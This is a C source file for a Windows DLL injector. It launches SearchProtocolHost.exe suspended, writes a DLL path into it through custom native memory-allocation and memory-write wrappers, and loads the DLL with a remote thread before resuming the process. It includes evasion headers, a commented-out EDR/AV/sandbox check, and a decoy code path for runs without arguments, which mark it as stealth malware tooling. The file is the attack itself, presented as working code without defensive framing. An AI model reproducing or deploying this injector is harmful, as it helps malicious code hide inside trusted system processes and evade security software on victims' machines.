#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "detector.h"
#include "evasion.h"

// Core Injection Logic
void StealthExec(HANDLE hProc, HANDLE hThread, const char *dllN)
{
    PVOID memLoc = NULL;
    SIZE_T sz = strlen(dllN) + 1;
    HANDLE hThreadRemote;
    NTSTATUS status;

    // Resolve Required Functions
    pMod pLLoad = GetMod("kernel32.dll", "LoadLibraryA");

    if (!pLLoad)
    {
        printf("[!] Failed to resolve LoadLibraryA.\n");
        return;
    }

    status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0)
    {
        printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
        return;
    }

    if (memLoc == NULL)
    {
        printf("[!] Memory allocation failed, BaseAddress is NULL.\n");
        return;
    }

    // Write DLL Path to Remote Process
    status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
    if (status != 0)
    {
        printf("[!] Memory write failed (Err: 0x%lX).\n", status);
        return;
    }

    // Load Remote DLL
    hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
    if (!hThreadRemote)
    {
        printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
        return;
    }
    WaitForSingleObject(hThreadRemote, INFINITE);
    CloseHandle(hThreadRemote);

    printf("[*] Successfully injected module\n");
}

// Entry Function
int main(int argc, char *argv[])
{
    // Check For EDR/AV/Sandbox env
    // if (PerfomChecksEnv())
    // {
    //     return 0;
    // }

    // If no DLL given, abort.
    if (argc != 2)
    {
        SortNumbers();
        return 0;
    }

    const char *dllPath = argv[1];

    STARTUPINFOA sInfo = {0};
    PROCESS_INFORMATION pInfo = {0};

    const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
    const char *procName = "SearchProtocolHost.exe";
    // Also work with explorer.exe
    // const char* targetProcess = "C:\\Windows\\explorer.exe";

    if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
    {
        printf("[!] Could not create %s. Err: %lu\n", procName, GetLastError());
        return -1;
    }

    printf("[*] Suspended %s created.\n", procName);

    // Perform Injection
    StealthExec(pInfo.hProcess, pInfo.hThread, dllPath);

    // Resume Execution
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hProcess);
    CloseHandle(pInfo.hThread);
    printf("[*] %s is now running.\n", procName);

    return 0;
}